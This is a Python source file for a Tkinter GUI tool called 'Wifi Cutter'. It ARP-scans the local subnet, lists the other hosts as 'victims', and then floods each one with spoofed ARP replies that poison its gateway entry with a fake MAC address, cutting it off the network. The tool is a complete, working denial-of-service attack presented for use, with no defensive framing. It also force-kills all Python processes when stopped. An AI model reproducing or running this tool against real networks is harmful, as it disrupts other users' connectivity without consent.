import tkinter as tk
from scapy.all import *
from os import system
from threading import Thread

# Create the main window
window = tk.Tk()
window.configure(background="black")
window.geometry("500x300")
window.title("Wifi Cutter | Developed by WanZ | v2023.0")
# tk.Label(window, text="Coded by WanZ \t\tV2023.0").grid()

# client_ip = []
# client_mac = []
# status = "Standby"
run_cut = False

def on_focus(event):
    gateway.delete(0, tk.END)
    # gateway.insert(0, "")
def off_focus(event):
    gateway.insert(0, "Gateway")

def pre_scan():
    status.config(text="Scanning", fg="cyan")
    Thread(target=scan_gateway).start()

def scan_gateway():
    global client_ip
    global client_mac
    
    client_ip = []
    client_mac = []
    
    if (gateway.get() != ""):
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="{}/24".format(gateway.get()))
        result = srp(packet, timeout=3, verbose=0)[0]
        
        for sent, received in result:
            if (str(received.psrc) != get_if_addr(conf.iface)):
                client_ip.append(received.psrc)
                client_mac.append(received.hwsrc)
        
        tk.Label(window, text=client_ip[0], fg='orange', bg='black').grid(row=4, column=0, padx=5, sticky=tk.W)
        tk.Label(window, text=client_mac[0], fg='orange', bg='black').grid(row=4, column=1, padx=1, sticky=tk.W)
        tk.Label(window, text="Gateway", fg='orange', bg='black').grid(row=4, column=2, padx=1, sticky=tk.W)
        
        tk.Label(window, text=get_if_addr(conf.iface), fg='yellow', bg='black').grid(row=5, column=0, padx=5, sticky=tk.W)
        tk.Label(window, text=get_if_hwaddr(conf.iface), fg='yellow', bg='black').grid(row=5, column=1, padx=1, sticky=tk.W)
        tk.Label(window, text="This Device", fg='yellow', bg='black').grid(row=5, column=2, padx=1, sticky=tk.W)
        
        
        if (len(client_ip) > 1):
            tk.Label(window, text="[ ! ] Victim's information [ ! ]", fg='white', bg='black').grid(row=7,column=0)
            tk.Label(window, text="IP Address", fg='white', bg='black').grid(row=8, column=0, padx=5, sticky=tk.W)
            tk.Label(window, text="Mac Address", fg='white', bg='black').grid(row=8, column=1, padx=1,  sticky=tk.W)
            for i in range(len(client_ip)):
                if (client_ip[i] != gateway.get()):
                    tk.Label(window, text=client_ip[i], fg="red", bg="black").grid(row=9+i, column=0,padx=5,sticky=tk.W)
                    tk.Label(window, text=client_mac[i], fg="red", bg="black").grid(row=9+i, column=1,padx=1,sticky=tk.W)
        else:
            system("msg * There is no other device(s) in this network. Try to perfrom another scan")
    else:
        system("msg * Please enter your gateway IP Address")
    status.config(text="Standby", fg="gray")
  
def cut(target_ip, target_mac):
    while True:
        send(ARP(pdst=target_ip, hwdst=target_mac,op=2, psrc=gateway.get(), hwsrc='12:34:56:78:9A:BC', ), verbose=0)

def run():
    global run_cut
    
    
    if run_cut == False:
        status.config(text="Running", fg='red')
        run.config(text = "Stop")
        run_cut = True
        for i in range(len(client_ip)):
            
            if i != 0:
                # Thread()
            #     # Thread(target=(cut, args=(client_ip[i], client_mac[i]))
                Thread(target=cut, args=(client_ip[i], client_mac[i])).start()
                # send(ARP(pdst=client_ip[i],hwdst=client_mac[i],op=2,psrc=gate))
    else:
        status.config(text = "Standby", fg="gray")
        run.config(text = "Run")
        run_cut = False
        system("taskkill /f /im python.exe  && msg * Shutting down the program")
    # print(run_cut)
# Create a Label widget


# Create an Entry widget
gateway = tk.Entry(window, width=35)
gateway.insert(0, "Gateway")
gateway.bind("<FocusIn>", on_focus)
gateway.bind("<FocusOut>", off_focus)
gateway.grid(row=0, column=0)

scan = tk.Button(window, text="Scan", command=pre_scan)
scan.grid(row=0,column=1, padx=1, sticky=tk.E)
run = tk.Button(window, text="Run", bg="red", fg="white", command=run)
run.grid(row=0,column=2, padx=1,sticky=tk.W)
tk.Label(window, text="Status: ", fg='white', bg='black').grid(row=0,column=6, padx=1, sticky=tk.E)
status = tk.Label(window, text="Standby", fg="gray", bg='black')
status.grid(row=0,column=7, padx=1, sticky=tk.W)
tk.Label(window, text="[ ! ] Attacker's information [ ! ]", fg='white', bg='black').grid()
# tk.Label(window, text="Gateway").grid(row=3, column=0, sticky=tk.W)

tk.Label(window, text="IP Address", fg='white', bg='black').grid(row=3, column=0, padx=5, sticky=tk.W)
tk.Label(window, text="Mac Address", fg='white', bg='black').grid(row=3, column=1, padx=1,  sticky=tk.W)
tk.Label(window, text="Device", fg='white', bg='black').grid(row=3,column=2, padx=1,sticky=tk.W)


# Start the main event loop
window.mainloop()
